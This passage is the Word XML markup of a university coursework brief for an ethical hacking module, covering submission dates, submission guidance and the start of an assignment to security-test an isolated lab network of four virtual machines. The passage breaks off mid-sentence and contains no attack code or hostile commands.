    <w:p w14:paraId="0145B939" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Submission Date:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Week 15 - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Tuesday 17</w:t>
      </w:r>
      <w:r w:rsidRPr="00823966">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:szCs w:val="20"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> December 23:59hrs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADF6698" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="176FB97A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Feedback Return Date:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>within 15 working days</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342B3DAF" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EA3D89" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Feedback Type:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Electronic </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A479E3E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>(eg verbal, Blackboard)</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="188E728A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BCCCC96" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Grading Criteria</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Refer to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>the bottom of this document.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD14FA9" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE9F6EF" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CB3286E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0022FCAD" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Submission Requirements:</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="59441DF0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:ind w:left="2835" w:hanging="2835"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="253D56A8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Your assessment must be submitted via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MyLearningSpace</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D32446C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C77B176" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Guidance on submitting via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MyLearningSpace</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is available at: </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r w:rsidRPr="002D4859">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:t>https://intranet.abertay.ac.uk/library/digital-skills/mylearningspace/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">but please contact the Support Enquiry Zone on 01382 308833 or </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:history="1">
        <w:r w:rsidRPr="00284733">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:t>sez@abertay.ac.uk</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> if you have any problems with submitting your work on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MyLearningSpace</w:t>
      </w:r>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DFC79F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F9EABC" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00284733">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Submission of your work after the submission date deadline will be deemed as late submission and will incur penalty, including the possibility of the work being awarded a non-submission (NS) grade.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAF358C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00284733" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="2835"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA5EA17" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="36" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="36" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Company Network Investigation (100% of Module Grade)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171250F8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>In the Ethical hacking labs (Rooms 4511 and 2022), a</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> typical company network has been set up for you to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>perform a security test on (details of this are shown below)</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B9010D" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="386A2A16" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">There are four virtual machines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">on the network and are </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">named Server1, Server2, Client1 and Client2. The IP addresses of these machines are </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.2</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.10</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.11</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> respectively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDD6A14" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="583B642B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>Note that e</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>ach student has a different virtual network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> to investigate meaning that you </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">must </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">perform the following procedure to </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">initialise your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">own </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>individual virtual network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797EBCD4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E1F10D9" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
